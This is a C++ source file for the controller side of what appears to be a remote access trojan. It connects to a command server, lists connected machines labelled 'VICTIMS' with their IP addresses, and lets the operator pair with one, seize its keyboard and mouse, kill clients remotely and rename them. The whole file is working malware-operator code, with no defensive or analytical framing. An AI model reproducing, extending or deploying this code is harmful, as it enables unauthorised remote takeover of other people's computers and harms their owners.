#include "controller.h"
#include "../secret.h"

Controller::Controller()
{
    //if needed create the file
    std::ofstream createFile("./ccontext.txt", std::ios::app);
    createFile.close();
    //read the context file
    std::ifstream readFile("./ccontext.txt");
    getline(readFile, name);

    //remove spaces before and after name
    while (name.size() > 0 && name[0] == ' ')
        name.erase(name.begin());
    while (name.size() > 0 && name[name.size() - 1] == ' ')
        name.erase(name.begin() + name.size() - 1);
    readFile.close();

    //connect and initialize connection with server
    connectServer();

    //receive packets from array
    std::thread receive(&Controller::receiveInfo, this);
    receive.detach();

    //take user input from console
    std::thread input(&Controller::takeCmdInput, this);
    input.detach();
}
void Controller::controlWindow()
{
    //set all keys to the current key states
    bool keys[255];
    for (int i = 0; i < 256; i++)
        keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));

    while (isRunning) {
        //send signal to server to keep awake
        if (Mlib::getTime() - lastAwakeSignal > 2'000) {
            sf::Packet p;
            p << sf::Uint8('r');
            server.send(p);
            lastAwakeSignal = Mlib::getTime();
        }

        //open window - connect server - skip
        if (!w.isOpen()) {
            //open window if needed
            if (isRunning && isConnected && isPaired && isControlling) {
                w.create(sf::VideoMode(), "Controller", sf::Style::Fullscreen);
                w.setFramerateLimit(20);
                sf::Packet p;
                p << sf::Uint8('a');
                server.send(p);
            }
            //reconnect with server if needed
            else if (isRunning && !isConnected) {
                std::cout << "DISCONNECTED FROM SERVER\n";
                controllers.clear();
                victims.clear();
                connectServer();
                std::thread receive(&Controller::receiveInfo, this);
                receive.detach();
            }
            //sleep for a bit and continue
            else {
                Mlib::sleep(50);
                continue;
            }
        }
        //close window and release keys
        else if (!isControlling || !isPaired) {
            w.close();
            sf::Packet p;
            p << sf::Uint8('a');
            server.send(p);
        }

        //catch windows events
        sf::Event e;
        while (w.pollEvent(e)) {
            if (e.type == sf::Event::Closed) {
                w.close();
                isControlling = false;
                sf::Packet p;
                p << sf::Uint8('a');
                server.send(p);
            }
            else if (e.type == sf::Event::MouseWheelScrolled)
            {
                sf::Packet p;
                p << sf::Uint8('k') << sf::Int8(e.mouseWheelScroll.delta);
                server.send(p);
            }   
        }

        //send mouse position if needed
        auto mousePos = Mlib::Mouse::getPos();
        if (mousePos != lastMousePos) {
            float x = mousePos.x / float(screenSize.x), y = mousePos.y / float(screenSize.y);
            sf::Packet p;
            p << sf::Uint8('l') << sf::Uint16(x * 256 * 256) << sf::Uint16(y * 256 * 256);
            server.send(p);
        }
        lastMousePos = mousePos;

        //send key pressed-released events if needed
        for (int i = 0; i < 256; i++) {
            bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
            if (!state && keys[i]) {
                sf::Packet p;
                p << sf::Uint8('m') << sf::Uint8(i);
                server.send(p);
            }
            else if (Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i))) {
                sf::Packet p;
                p << sf::Uint8('n') << sf::Uint8(i);
                server.send(p);
            }
            keys[i] = state;
        }

        w.clear(sf::Color(30, 30, 30));
        w.display();
    }
}

void Controller::receiveInfo()
{
    while (true)
    {
        sf::Packet p;
        server.receive(p);
        //disconnect server if packet is invalid
        if (p.getDataSize() == 0) {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }

        sf::Uint8 cmd;
        p >> cmd;

        //add new controller/victim info
        if (cmd == 'n' || cmd == 'l') {
            Client c;
            sf::Uint32 ip;
            p >> c.id >> c.name >> c.time >> ip >> c.port >> c.otherId;
            c.ip = sf::IpAddress(ip).toString();
            if (cmd == 'n')
                controllers.push_back(c);
            else
                victims.push_back(c);
        }
        //clear clients list
        else if (cmd == 'q') {
            controllers.clear();
            victims.clear();
        }
        //display clients info
        else if (cmd == 'd') {
            displayList();
        }
        //apparently controller isnt initialized
        else if (cmd == '?') {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }
        //pair controller with victim
        else if (cmd == 'p')
        {
            isPaired = true;
            isControlling = false;
        }
        //un-pair controller with victim
        else if (cmd == 'u')
        {
            isPaired = false;
            isControlling = false;
        }
        //exit program
        else if (cmd == 'e') {
            isRunning = false;
        }
        //rename client
        else if (cmd == 'w') {
            p >> name;
            std::ofstream file("./ccontext.txt", std::ios::trunc);
            file.write(name.c_str(), name.size());
            file.close();
        }
    }
}
void Controller::takeCmdInput()
{
    while (true) {
        //take input from console
        std::string cmd;
        getline(std::cin, cmd);

        if (!isConnected)
            continue;

        //connect to a given victim
        if (cmd.substr(0, 7) == "connect" && !isPaired) {
            cmd.erase(0, 7);

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd);
            } 
            catch (std::invalid_argument e) {
                continue;
            } 
            catch (std::out_of_range e) {
                continue;
            }

            //check if victim with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('p') << v.id;
                server.send(p);
                break;
            }
        }
        //disconnect from victim
        else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
            sf::Packet p;
            p << sf::Uint8('u');
            server.send(p);
        }
        //start controlling the victim
        else if (cmd.substr(0, 7) == "control" && isPaired) {
            Mlib::sleep(500);
            isControlling = true;
        }
        //kill a given client
        else if (cmd.substr(0, 4) == "kill") {
            cmd.erase(0, 4);

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('e') << v.id;
                server.send(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('e') << c.id;
                server.send(p);
                break;
            }
        }
        //rename a given client
        else if (cmd.substr(0, 4) == "name") {
            cmd.erase(0, 4);
            //check if input is valid
            if (cmd.find(':') == std::string::npos)
                continue;

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd.substr(0, cmd.find(':')));
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //remove spaces from before and after the string
            std::string name = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
            while (name.size() > 0 && name[0] == ' ')
                name.erase(name.begin());
            while (name.size() > 0 && name[name.size() - 1] == ' ')
                name.erase(name.begin() + name.size() - 1);

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('w') << v.id << name;
                server.send(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('w') << c.id << name;
                server.send(p);
                break;
            }
        }
    }
}

void Controller::connectServer()
{
connect:
    //connect to server
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
    std::cout << "connected with server\n";

init:
    sf::Packet p;
    p << sf::Uint8('c') << name;
    //tell server the role and the name
    if (server.send(p) == sf::Socket::Disconnected)
        goto connect;

    p.clear();
    if (server.receive(p) == sf::Socket::Disconnected)
        goto connect;
    sf::Uint8 role = '-';
    //check if the server has initialized the controller, else try again
    p >> role;
    if (role != 'c')
        goto init;
    //get the connection id
    p >> id;
    std::cout << "connection with server approved\n";

    isConnected = true;
}
void Controller::displayList()
{
    system("CLS");
    std::cout << "last update time: " << Mlib::getTime() / 1000 << " - id: " << id << "\n\n";

    std::cout << "CONTROLLERS:\n";
    //output information for each controller
    for (const auto& c : controllers) {
        std::cout << "   id: " << c.id << " [" << c.name << "]";
        if (c.id == id)
            std::cout << " (you)";
        std::cout << " = " << c.ip << ':' << c.port << " - time: " << c.time;
        if (c.otherId == 0)
            std::cout << " - not paired\n";
        else
            std::cout << " - paired with " << c.otherId << "\n";
    }

    std::cout << "\nVICTIMS:\n";
    //output information for each victim
    for (const auto& v : victims) {
        std::cout << "   id: " << v.id << " [" << v.name << "] = " << v.ip << ':' << v.port << " - time: " << v.time;
        if (v.otherId == 0)
            std::cout << " - not paired\n";
        else {
            std::cout << " - paired with " << v.otherId;
            if (v.otherId == id)
                std::cout << " (you)";
            std::cout << '\n';
        }
    }
    std::cout << '\n';
}
